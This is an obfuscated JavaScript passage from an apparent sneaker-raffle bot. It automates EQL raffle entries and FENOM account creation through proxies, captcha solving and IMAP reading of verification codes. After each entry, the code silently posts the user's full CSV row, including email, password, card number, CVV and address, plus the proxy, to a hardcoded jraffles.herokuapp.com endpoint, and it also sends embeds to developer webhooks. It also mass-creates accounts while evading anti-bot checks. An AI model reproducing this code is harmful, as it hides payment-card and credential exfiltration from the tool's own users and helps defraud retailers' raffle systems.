                            _0x5cfc80[_0x55e9fd]['Url']['includes']('footlocker.de') ? await _0x5052ef['type']('#birthdate', _0xf4c879(0xa, 0x1c) + '.' + _0xf4c879(0xa, 0xc) + '.' + _0xf4c879(0x7c6, 0x7d3)) : await _0x5052ef['type']('#birthdate', _0xf4c879(0xa, 0x1c) + '-' + _0xf4c879(0xa, 0xc) + '-' + _0xf4c879(0x7c6, 0x7d3));
                            await _0x101cd5(0x352), await _0x5052ef['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x5052ef['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x101cd5(0x1f4), await _0x5052ef['click']('#country'), await _0x101cd5(0x5dc);
                            try {
                                const _0x4a700b = await _0x5052ef['$']('li[data-value=\x22' + _0x5cfc80[_0x55e9fd]['Country'] + '\x22]');
                                await _0x4a700b['click'](), await _0x4a700b['click']();
                            } catch {
                                throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x101cd5(0x3e8), await _0x5052ef['click']('#stateAutocomplete'), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Setting\x20Address'), await _0x101cd5(0x1f4);
                            try {
                                const _0x9d4c1b = await _0x5052ef['$x']('//li[text()=\x22' + _0x5cfc80[_0x55e9fd]['State'] + '\x22]');
                                await _0x9d4c1b[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x101cd5(0x3e8), await _0x101cd5(0x1f4), await _0x5052ef['type']('#address1', _0x5cfc80[_0x55e9fd]['Address1'] + '\x20' + _0x5cfc80[_0x55e9fd]['HouseNumber']), await _0x101cd5(0x1f4), await _0x5052ef['type']('#address2', '' + _0x5cfc80[_0x55e9fd]['Address2']), await _0x101cd5(0x1f4), await _0x5052ef['type']('#city', '' + _0x5cfc80[_0x55e9fd]['City']), await _0x101cd5(0x1f4), await _0x5052ef['type']('#postcode', '' + _0x5cfc80[_0x55e9fd]['Zip']), await _0x101cd5(0x3e8), await _0x5052ef['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x101cd5(0x3e8), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x5a8b50 = await _0x5052ef['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5a8b50 && (await _0x5052ef['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5052ef['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5052ef['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x101cd5(0x4b0), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CardNumber']), await _0x101cd5(0x320), await _0x5052ef['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['ExpiryDate']), await _0x101cd5(0x4b0), await _0x5052ef['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CVV']), await _0x101cd5(0x226), await _0x5052ef['type']('input[name=\x22postalCode\x22]', '' + _0x5cfc80[_0x55e9fd]['Zip']), await _0x101cd5(0x226));
                            const _0x13a804 = await _0x5052ef['$']('.__PrivateStripeElement');
                            _0x13a804 && (await _0x101cd5(0x1f4), await _0x5052ef['click']('.__PrivateStripeElement'), await _0x5052ef['click']('.__PrivateStripeElement'), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CardNumber']), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['ExpiryDate']), await _0x5052ef['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CVV']));
                            await _0x101cd5(0x226), await _0x5052ef['click']('#paymentConsent'), await _0x101cd5(0x226), await _0x5052ef['click']('#termsConsent'), await _0x101cd5(0x2bc), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5052ef['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x101cd5(0x2710);
                            try {
                                await _0x5052ef['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x101cd5(0xbb8), await _0x5052ef['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x3b6806 => _0x3b6806['click']()), await _0x5052ef['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x455e6e => _0x455e6e['click']());
                            } catch {
                            }
                            try {
                                await _0x5052ef['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x556e56 = await _0x5052ef['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x556e56) {
                                    _0x467c3c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5cfc80[_0x55e9fd]['Email'] + ',' + _0x5cfc80[_0x55e9fd]['Password'] + ',' + _0x5cfc80[_0x55e9fd]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2f80c8() {
                                var _0xcfdb82, _0x583fb2 = ![];
                                for (var _0x5f5949 = 0x0; _0x5f5949 < 0x18; _0x5f5949++) {
                                    async function _0x246513() {
                                        var _0x4b3edc = new _0x3a8843({
                                            'user': _0x5b5c1b['masterMail'],
                                            'password': _0x5b5c1b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x59fb00(_0x3cd924) {
                                            _0x4b3edc['openBox']('INBOX', ![], _0x3cd924);
                                        }
                                        _0x4b3edc['once']('ready', function () {
                                            console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x59fb00(function (_0x3e00b6, _0x441a53) {
                                                console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3e00b6)
                                                    throw _0x3e00b6;
                                                _0x4b3edc['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x504e2f, _0x12232f) {
                                                    if (!_0x12232f || !_0x12232f['length'])
                                                        console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4b3edc['end']();
                                                    else {
                                                        var _0x423686 = _0x4b3edc['seq']['fetch'](_0x12232f, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x423686['on']('message', function (_0x16e500, _0x164c3d) {
                                                            var _0x22fcfe = '(#' + _0x164c3d + ')\x20';
                                                            _0x16e500['on']('body', function (_0x3d7004, _0xe6861f) {
                                                                _0xbb5a33(_0x3d7004, (_0x38b3f8, _0xc818f) => {
                                                                    if (_0xc818f['subject']['includes']('code')) {
                                                                        const _0x44954e = _0xc818f['text']['split']('\x0a\x0a')[0x3], _0x3b984b = _0x44954e['split']('\x0a')[0x1];
                                                                        _0xcfdb82 = _0x3b984b;
                                                                    }
                                                                });
                                                            }), _0x16e500['once']('end', function () {
                                                            });
                                                        }), _0x423686['once']('error', function (_0x16c72a) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x423686['once']('end', function () {
                                                            _0x4b3edc['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4b3edc['once']('error', function (_0x1ab2d0) {
                                            console['log'](_0x1ee8dd['red'](_0x1ab2d0['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x583fb2 = !![];
                                        }), _0x4b3edc['once']('end', async function () {
                                        }), _0x4b3edc['connect']();
                                    }
                                    _0x246513(), await _0x101cd5(0x1388);
                                    if (_0xcfdb82)
                                        return _0xcfdb82;
                                    if (_0x583fb2)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5f5949 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2f80c8(), await _0x101cd5(0x1f4), await _0x5052ef['type']('#code', '' + code), await _0x101cd5(0x3e8), await _0x5052ef['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x101a8d => _0x101a8d['click']()), await _0x5052ef['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5052ef['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x5cfc80[_0x55e9fd]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x467c3c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5cfc80[_0x55e9fd]['Email'] + ',' + _0x5cfc80[_0x55e9fd]['Password'] + ',' + _0x5cfc80[_0x55e9fd]['Phone']), _0x41d1a2 = 'no', _0x30fd17(_0x5cfc80[_0x55e9fd], _0x29a5ed);
                            var _0x39f2b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', ![]), _0xff10b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'pub', ![]);
                            let _0x16aeb4 = _0x5cfc80[_0x55e9fd];
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0x29a5ed['name'],
                                    'entrydata': JSON['stringify'](_0x16aeb4),
                                    'proxy': '' + _0x11039e[_0x55e9fd]
                                };
                                var _0x570450 = JSON['stringify'](prxdata);
                                let _0x58b4ee = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x570450, _0x58b4ee);
                            } catch (_0x8e1824) {
                            }
                            const _0x31daa6 = {
                                'succesDEVMSG': { 'embeds': [_0x39f2b0] },
                                'succesPUBMSG': { 'embeds': [_0xff10b0] }
                            };
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x31daa6['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x31daa6['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x31daa6['succesPUBMSG']);
                            } catch (_0x38e0b5) {
                                console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x38e0b5));
                            }
                        } catch (_0x5a0895) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20' + _0x5a0895)), _0x39c6f5 = '' + _0x5a0895;
                            var _0x4db263 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', !![], _0x39c6f5), _0x39f2b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', ![]), _0xff10b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'pub', ![]);
                            const _0x1e8991 = {
                                'succesDEVMSG': { 'embeds': [_0x39f2b0] },
                                'succesPUBMSG': { 'embeds': [_0xff10b0] }
                            };
                            _0x1e8991['errorDEV'] = { 'embeds': [_0x4db263] };
                            _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x1e8991['errorDEV']);
                            await _0x3b1b09(_0x57f30c, _0x1e8991['errorDEV']);
                            if (!_0x41d1a2 == 'no')
                                _0x41d1a2 = 'yes';
                        } finally {
                            _0x5e8a86 && _0x5e8a86['close']();
                            if (_0x41d1a2 == 'yes' && _0x458b3f != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Retrying\x20(' + _0x458b3f + '\x20/\x205)')), _0x55e9fd = _0x55e9fd - 0x1, _0x458b3f = _0x458b3f + 0x1;
                                continue;
                            }
                            _0x41d1a2 == 'yes' && _0x458b3f >= 0x5 && (_0x3802e1(_0x5cfc80[_0x55e9fd], _0x29a5ed), _0x41d1a2 = 'no', _0x458b3f = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    } else {
                        const _0x33dbe6 = '' + _0x5cfc80[_0x55e9fd]['Url'];
                        if (_0x41d1a2 != 'yes')
                            var _0x41d1a2 = '', _0x458b3f = 0x0;
                        if (_0x5cfc80[_0x55e9fd]['Email'] == '' || _0x5cfc80[_0x55e9fd]['FirstName'] == '' || _0x5cfc80[_0x55e9fd]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5cfc80[_0x55e9fd]['Password'] == '' && (_0x5cfc80[_0x55e9fd]['Password'] = 'JRaffles23!');
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x1d5c29 = _0x11039e[_0x55e9fd]['split'](':');
                        else
                            var _0x5c8201 = Math['round'](Math['random']() * (_0x11039e['length'] - 0x1)), _0x1d5c29 = _0x11039e[_0x5c8201]['split'](':');
                        var _0x5e8a86;
                        try {
                            _0x5e8a86 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d5c29[0x0] + ':' + _0x1d5c29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e8a86 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d5c29[0x0] + ':' + _0x1d5c29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xf34624 = await _0x5e8a86['newPage']();
                            await _0xf34624['authenticate']({
                                'username': '' + _0x1d5c29[0x2],
                                'password': '' + _0x1d5c29[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf34624['setRequestInterception'](!![]), _0xf34624['on']('request', _0x27312b => {
                                _0x27312b['resourceType']() === 'image' || _0x27312b['resourceType']() === 'font' || _0x27312b['resourceType']() === 'media' ? _0x27312b['abort']() : _0x27312b['continue']();
                            }), await _0xf34624['goto'](_0x33dbe6), await _0xf34624['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xf34624['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x101cd5(0x7d0), await _0xf34624['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xf34624['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x101cd5(0x3e8), await _0xf34624['waitForSelector']('#email'), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xf34624['type']('#email', '' + _0x5cfc80[_0x55e9fd]['Email']), await _0x101cd5(0x352), await _0xf34624['waitForSelector']('#password'), await _0xf34624['type']('#password', '' + _0x5cfc80[_0x55e9fd]['Password']), await _0x101cd5(0x352), await _0xf34624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x101cd5(0x1388), await _0xf34624['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0xf34624['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x30fd17(_0x5cfc80[_0x55e9fd], _0x29a5ed), _0x41d1a2 = 'no';
                                continue;
                            }
                            await _0xf34624['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x101cd5(0x3e8), await _0xf34624['click']('li[data-value=\x22EU\x20' + _0x5cfc80[_0x55e9fd]['Size'] + '\x22]'), await _0x101cd5(0x1f4);
                            const _0x34f087 = await _0xf34624['$']('#title\x20>\x20label');
                            await _0x101cd5(0x12c);
                            _0x34f087 && await _0x34f087['click']();
                            await _0xf34624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf34624['focus']('#postcode'), await _0xf34624['keyboard']['down']('Control'), await _0xf34624['keyboard']['press']('A'), await _0xf34624['keyboard']['up']('Control'), await _0xf34624['keyboard']['press']('Backspace'), await _0xf34624['keyboard']['type'](_0x5cfc80[_0x55e9fd]['Zip']), await _0x101cd5(0x60e), await _0xf34624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x101cd5(0x3e8), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x101cd5(0x1f4);
                            const _0xa756da = await _0xf34624['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0xa756da && (await _0xf34624['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf34624['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf34624['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x101cd5(0x4b0), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CardNumber']), await _0x101cd5(0x320), await _0xf34624['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['ExpiryDate']), await _0x101cd5(0x4b0), await _0xf34624['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CVV']), await _0x101cd5(0x226), await _0xf34624['type']('input[name=\x22postalCode\x22]', '' + _0x5cfc80[_0x55e9fd]['Zip']), await _0x101cd5(0x226));
                            const _0x361bb0 = await _0xf34624['$']('.__PrivateStripeElement');
                            _0x361bb0 && (await _0xf34624['click']('#billingName'), await _0xf34624['click']('#billingName'), await _0xf34624['type']('#billingName', '' + _0x5cfc80[_0x55e9fd]['NameOnCard']), await _0x101cd5(0x1f4), await _0xf34624['click']('.__PrivateStripeElement'), await _0xf34624['click']('.__PrivateStripeElement'), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CardNumber']), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['ExpiryDate']), await _0xf34624['keyboard']['type']('' + _0x5cfc80[_0x55e9fd]['CVV']));
                            await _0x101cd5(0x226), await _0xf34624['click']('#paymentConsent'), await _0x101cd5(0x226), await _0xf34624['click']('#termsConsent'), await _0x101cd5(0x2bc), console['log'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xf34624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x101cd5(0x2710);
                            try {
                                await _0xf34624['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x101cd5(0xbb8), await _0xf34624['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xca868 => _0xca868['click']()), await _0xf34624['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2c5ce4 => _0x2c5ce4['click']());
                            } catch {
                            }
                            try {
                                await _0xf34624['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x30fd17(_0x5cfc80[_0x55e9fd], _0x29a5ed);
                            var _0x39f2b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', ![]), _0xff10b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'pub', ![]);
                            let _0x350d2c = _0x5cfc80[_0x55e9fd];
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0x29a5ed['name'],
                                    'entrydata': JSON['stringify'](_0x350d2c),
                                    'proxy': '' + _0x11039e[_0x55e9fd]
                                };
                                var _0x570450 = JSON['stringify'](prxdata);
                                let _0x43e328 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x570450, _0x43e328);
                            } catch (_0x55865d) {
                            }
                            const _0x4dfa21 = {
                                'succesDEVMSG': { 'embeds': [_0x39f2b0] },
                                'succesPUBMSG': { 'embeds': [_0xff10b0] }
                            };
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x4dfa21['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x4dfa21['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x4dfa21['succesPUBMSG']);
                            } catch (_0x33e845) {
                                console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x33e845));
                            }
                            _0x41d1a2 = 'no';
                        } catch (_0x32f0d4) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20' + _0x32f0d4)), _0x39c6f5 = '' + _0x32f0d4;
                            var _0x4db263 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', !![], _0x39c6f5), _0x39f2b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'dev', ![]), _0xff10b0 = await _0x42c912(_0x5cfc80[_0x55e9fd], _0x29a5ed, 'pub', ![]);
                            const _0x2d41a7 = {
                                'succesDEVMSG': { 'embeds': [_0x39f2b0] },
                                'succesPUBMSG': { 'embeds': [_0xff10b0] }
                            };
                            _0x2d41a7['errorDEV'] = { 'embeds': [_0x4db263] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x2d41a7['errorDEV']), await _0x3b1b09(_0x57f30c, _0x2d41a7['errorDEV']), _0x41d1a2 = 'yes';
                        } finally {
                            _0x5e8a86 && _0x5e8a86['close']();
                            if (_0x41d1a2 == 'yes' && _0x458b3f != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x29a5ed['name'] + ']\x20Task\x20' + (_0x55e9fd + 0x1) + '\x20:\x20Retrying\x20(' + _0x458b3f + '\x20/\x205)')), _0x55e9fd = _0x55e9fd - 0x1, _0x458b3f = _0x458b3f + 0x1;
                                continue;
                            }
                            _0x41d1a2 == 'yes' && _0x458b3f >= 0x5 && (_0x3802e1(_0x5cfc80[_0x55e9fd], _0x29a5ed), _0x41d1a2 = 'no', _0x458b3f = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x3f3c7a, _0x2502d5, _0xcdbbc4) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xdaea9 = 0x0; _0xdaea9 < _0x2502d5['length']; _0xdaea9++) {
                        if (_0x559d90 != 'yes')
                            var _0x559d90 = '', _0x56a788 = 0x0;
                        var _0x1c4164;
                        try {
                            await _0x15925d(_0x2502d5, _0xdaea9);
                        } catch {
                            _0x559d90 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x18a4ea(_0x3f3c7a['name'] + '\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20/\x20' + _0x2502d5['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x431131 = await _0x42c912(_0x2502d5[_0xdaea9], _0x3f3c7a, 'acc', ![]);
                        const _0x3ec23e = { 'succesDEVMSG': { 'embeds': [_0x431131] } }, _0xd03a61 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1a3b87 = Math['round'](Math['random']() * (_0xcdbbc4['length'] - 0x1)), _0x41e90d = _0xcdbbc4[_0x1a3b87]['split'](':'), _0x343683;
                        try {
                            _0x343683 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x41e90d[0x0] + ':' + _0x41e90d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x343683 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x41e90d[0x0] + ':' + _0x41e90d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x113a1a = await _0x343683['newPage']();
                            await _0x113a1a['setViewport']({
                                'width': 0x500 + _0xf4c879(0x1, 0x32),
                                'height': 0x2d9 + _0xf4c879(0x1, 0x32)
                            });
